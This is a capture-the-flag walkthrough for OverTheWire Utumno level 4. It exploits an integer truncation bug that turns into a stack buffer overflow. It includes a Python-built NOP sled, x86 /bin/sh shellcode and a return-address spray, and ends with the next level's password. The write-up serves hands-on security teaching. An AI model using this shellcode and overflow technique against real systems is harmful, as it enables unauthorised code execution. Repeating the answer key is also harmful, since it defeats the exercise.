# Utumno Level 4 → 5

## Goal

`utumno4` takes a numeric `size` argument and a buffer. It validates `size` against some maximum, but then **truncates `size` to 16 bits** (`mov WORD PTR`) before using it in a copy loop. Passing `size = 65536` wraps to 0 → "copy 0 bytes" passes the check, but other code paths use the full 32-bit size elsewhere, copying a *lot* more than the buffer holds. Classic **integer truncation** bug; result is a huge buffer overflow.

## Concepts you'll learn

- **Integer truncation** vulnerabilities — a value is validated as 32-bit but used as 16-bit (or vice versa)
- Spotting `mov WORD PTR` / `movzx` / explicit `(short)` casts during disassembly
- Weaponising a large overflow with a long NOP sled because you have space to spare

## Walkthrough

### 1. Disassemble and find the truncation

```bash
$ gdb -q /utumno/utumno4
(gdb) disassemble main
```

Look for an instruction sequence like:

```
mov    ax, WORD PTR [ebp+0x8]    ; take low 16 bits of first arg
test   ax, ax
je     <skip>
cmp    ax, 0x4000
ja     <too_big>
```

So the check is on the **low 16 bits** of your `size` argument. Pass `size = 65536 (0x10000)`, and `ax` = 0 → the check is satisfied as "0 bytes."

But somewhere after the check, the full 32-bit `size` is used in a copy loop — so the copy actually runs for 65536 bytes, destroying the stack.

### 2. Craft the payload

A 65536-byte payload is more than enough to contain a massive NOP sled, your shellcode, and still have room to spare. Under `gdb`:

- Inspect the stack after the (intended) write to locate where your payload will live.
- Pick a return address in the middle of the NOP sled.

```bash
$ PAYLOAD=$(python3 -c '
import sys
sled = b"\x90"*60000
sc = b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
ret = b"\xXX\xXX\xff\xff"  # address inside the sled, find with gdb
sys.stdout.buffer.write(sled + sc + ret * 100)
')
$ /utumno/utumno4 65536 "$PAYLOAD"
```

With a sled that big, you can afford to overshoot the return address location — some of your `ret * 100` values will land on the saved EIP slot, and with a giant sled the jump almost always hits valid NOPs.

```bash
$ whoami
utumno5
$ cat /etc/utumno_pass/utumno5
woucaejiek
```

## The answer

The password for `utumno5` is:

**`woucaejiek`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/utumno/utumno4.html>
